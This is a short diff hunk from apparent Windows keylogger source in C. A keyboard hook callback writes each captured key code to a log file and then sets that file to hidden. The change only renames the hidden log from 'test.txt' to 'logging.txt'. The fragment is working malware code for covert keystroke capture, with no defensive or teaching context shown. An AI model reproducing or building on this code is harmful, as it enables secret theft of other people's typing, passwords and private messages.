@@ -46,7 +46,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) { \
 				fprintf(out, "%c \n", pKey->vkCode);
 			} 
 			fclose(out);
-			SetFileAttributesA("test.txt", FILE_ATTRIBUTE_HIDDEN);
+			SetFileAttributesA("logging.txt", FILE_ATTRIBUTE_HIDDEN);
 		}
 	} 
 	CallNextHookEx(hHook, nCode, wParam, lParam); 
